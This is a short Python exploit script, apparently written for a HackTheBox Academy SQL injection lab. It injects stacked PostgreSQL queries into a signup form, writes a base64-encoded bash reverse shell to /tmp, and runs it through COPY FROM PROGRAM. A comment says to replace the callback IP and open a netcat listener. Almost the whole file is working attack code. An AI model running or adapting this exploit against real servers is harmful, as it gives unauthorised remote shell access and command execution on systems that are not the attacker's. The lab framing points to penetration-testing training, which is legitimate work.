#!/usr/bin/env python3

"""Created this script to solve the HackTheBox Academy lab called 'Reading and Writing Files' and the lab called 'Command Execution' for the module called 'Advanced SQL Injections'. 
This script exploits a blind postgreSQL injection to write a file and to get a reverse shell on the target"""

# The base64 string below is base64 of the following reverse shell command: bash -c "bash -i  >& /dev/tcp/127.0.0.1/4444 0>&1".  Update the IP address in the base64 string, and open a netcat listener before running the script.  

import random
import string
import requests
import urllib.parse

target= "10.129.21.193:8080"
proxies= {"http":"http://127.0.0.1:8081"}
headers= {"Content-Type": "application/x-www-form-urlencoded"}

def generate_random_word():
    all_chars= string.digits + string.ascii_letters
    random_group = random.sample(all_chars, 16)
    return ''.join(random_group)

random_group = generate_random_word()

payload=f"create+table+{random_group}(mycol+text);Insert+into+{random_group}+values+($$echo+-n+YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzQ0NDQgMD4mMSAi|base64+-d|bash$$);COPY+{random_group}+TO+'/var/lib/postgresql/proof.txt';COPY+{random_group}+TO+'/tmp/atest.sh';copy+{random_group}+FROM+program+'chmod+777+/tmp/atest.sh';copy+{random_group}+from+program+'/tmp/atest.sh'--+-"

data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');{payload}&email={random_group}@a.com&password=test&repeatPassword=test\n"

response= requests.post(url= f"http://{target}/signup", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data)
